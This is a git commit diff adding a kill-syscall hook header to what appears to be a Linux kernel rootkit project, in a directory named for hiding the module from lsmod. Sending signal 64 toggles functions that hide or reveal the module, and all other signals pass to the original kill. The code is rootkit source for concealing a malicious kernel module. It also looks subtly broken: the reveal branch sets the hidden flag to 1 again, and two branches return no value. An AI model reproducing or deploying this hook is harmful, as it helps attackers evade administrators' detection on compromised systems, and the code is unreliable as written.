bfa23dbde66568cadfb5852e70b8eb78f0849440
fs3cs0ciety <fs3cs0ciety@gmail.com>
2024-11-05 18:52:45 -0500

    Update kill.h

--- src/1.2_hide_lsmod/syscall_hooks/kill.h
+++ src/1.2_hide_lsmod/syscall_hooks/kill.h
@@ -1,1 +1,29 @@
+#ifndef _KILL_H_
+#define _KILL_H_
 
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
+
+notrace asmlinkage int hook_kill(const struct pt_regs *regs) {
+
+    void showme(void);
+    void hideme(void);
+
+    int sig = regs->si;
+
+    if ( (sig == 64) && (hidden == 0) ) {
+
+        hideme();
+        hidden = 1;
+    }
+    else if ( (sig == 64) && (hidden == 1) ) {
+
+        showme();
+        hidden = 1;
+    }
+    else {
+
+        return orig_kill(regs);
+    }
+}
+
+#endif
